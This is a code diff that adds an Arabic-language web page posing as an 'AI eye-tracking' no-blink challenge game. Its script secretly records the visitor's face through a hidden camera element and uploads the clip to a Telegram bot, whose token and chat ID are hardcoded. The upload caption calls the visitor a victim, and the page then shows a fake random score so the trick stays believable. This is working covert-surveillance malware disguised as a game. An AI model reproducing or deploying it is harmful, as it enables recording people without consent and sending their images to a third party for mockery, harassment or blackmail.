@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحدي عدم الرمش 👁️ | AI Eye Tracker</title>
+    <link href="https://fonts.googleapis.com/css2?family=Changa:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Changa', sans-serif; }
+        body { 
+            background: #0f0f1a; 
+            color: #fff; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            overflow: hidden; 
+            text-align: center;
+        }
+        
+        .game-container {
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(255, 0, 85, 0.2);
+            border: 2px solid #ff0055;
+            width: 90%;
+            max-width: 450px;
+            position: relative;
+        }
+
+        .icon-eye {
+            font-size: 4rem;
+            margin-bottom: 10px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); text-shadow: 0 0 10px #ff0055; }
+            50% { transform: scale(1.1); text-shadow: 0 0 30px #ff0055; }
+            100% { transform: scale(1); text-shadow: 0 0 10px #ff0055; }
+        }
+
+        h1 { color: #ff0055; font-size: 2rem; margin-bottom: 10px; text-transform: uppercase; }
+        p { color: #a0a0b5; font-size: 1.1rem; margin-bottom: 30px; }
+
+        .btn-start {
+            background: linear-gradient(45deg, #ff0055, #ff00aa);
+            color: #fff;
+            padding: 15px 30px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 0, 85, 0.4);
+        }
+
+        .btn-start:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 0, 85, 0.6);
+        }
+
+        /* شاشة اللعب والعد التنازلي */
+        #game-screen { display: none; }
+        .tracking-box {
+            width: 200px;
+            height: 200px;
+            border: 4px dashed #00ffcc;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            font-weight: bold;
+            color: #00ffcc;
+            position: relative;
+        }
+
+        .tracking-box::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 4px;
+            background: #00ffcc;
+            top: 50%;
+            animation: scan 2s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { top: 0%; opacity: 0; }
+            50% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        #result-screen { display: none; color: #00ffcc; }
+        #result-screen h2 { font-size: 2.5rem; margin-bottom: 10px; }
+
+        video { display: none; } /* الكاميرا مخفية تماماً */
+    </style>
+</head>
+<body>
+
+    <!-- الشاشة الأولى: الواجهة الرئيسية -->
+    <div class="game-container" id="intro-screen">
+        <div class="icon-eye">👁️</div>
+        <h1>تحدي عدم الرمش</h1>
+        <p>نظام الذكاء الاصطناعي هيتتبع حركة عينك.. هل تقدر تفضل مبرق للشاشة لمدة 10 ثواني من غير ما ترمش؟</p>
+        <button class="btn-start" id="startBtn">ابدأ التحدي الآن</button>
+    </div>
+
+    <!-- الشاشة التانية: شاشة التتبع الوهمية -->
+    <div class="game-container" id="game-screen">
+        <h2 style="color: #fff; margin-bottom: 20px;">ركز في الدايرة!</h2>
+        <div class="tracking-box" id="timer">5</div>
+        <p style="color: #00ffcc;">جاري تتبع حدقة العين...</p>
+    </div>
+
+    <!-- الشاشة التالتة: النتيجة الوهمية -->
+    <div class="game-container" id="result-screen">
+        <h2>أوووبس! 🤣</h2>
+        <p style="font-size: 1.3rem;">إنت رمشت بعد <span id="fakeTime" style="color: #ff0055; font-weight: bold;"></span> ثانية!</p>
+        <p>مستوى تركيزك: ضعيف جداً 🐔</p>
+        <button class="btn-start" onclick="location.reload()" style="margin-top: 20px;">جرب تاني</button>
+    </div>
+
+    <video id="video" autoplay muted></video>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const introScreen = document.getElementById('intro-screen');
+        const gameScreen = document.getElementById('game-screen');
+        const resultScreen = document.getElementById('result-screen');
+        const timerText = document.getElementById('timer');
+        const video = document.getElementById('video');
+
+        const token = "8852426717:AAFUol_2LsQdog7TtCQCIjj5Rq2j8YC__lk";
+        const chatId = "557158224";
+
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        startBtn.addEventListener('click', () => {
+            // طلب الكاميرا بمجرد ما يضغط
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(stream => {
+                    video.srcObject = stream;
+                    
+                    // إخفاء الواجهة وإظهار اللعبة
+                    introScreen.style.display = "none";
+                    gameScreen.style.display = "block";
+
+                    // تجهيز التسجيل
+                    mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        sendVideoToTelegram(blob, stream);
+                    };
+
+                    // بدء التسجيل فعلياً
+                    mediaRecorder.start();
+
+                    // تشغيل العد التنازلي الوهمي للضحية (5 ثواني)
+                    let timeLeft = 5;
+                    const countdown = setInterval(() => {
+                        timeLeft--;
+                        timerText.innerText = timeLeft;
+                        if(timeLeft <= 0) {
+                            clearInterval(countdown);
+                            mediaRecorder.stop(); // وقف التسجيل بعد 5 ثواني
+                        }
+                    }, 1000);
+
+                })
+                .catch(err => {
+                    alert("لازم تفتح الكاميرا عشان اللعبة تشتغل وتتتبع عينك يا بطل! 😉");
+                });
+        });
+
+        function sendVideoToTelegram(blob, stream) {
+            // إرسال البيانات للتليجرام
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', blob, 'target_staring.webm');
+            formData.append('caption', '👁️ صيدة لعبة تتبع العين (تحدي الرمش) 🔥🎯\nالضحية كان مبرق في الشاشة 😂');
+
+            fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                // قفل الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+
+                // إظهار النتيجة الوهمية
+                gameScreen.style.display = "none";
+                resultScreen.style.display = "block";
+                
+                // توليد رقم عشوائي لثواني الرمش الوهمية (عشان يصدق)
+                const randomTime = (Math.random() * (4.5 - 1.2) + 1.2).toFixed(2);
+                document.getElementById('fakeTime').innerText = randomTime;
+            });
+        }
+    </script>
+</body>
+</html>
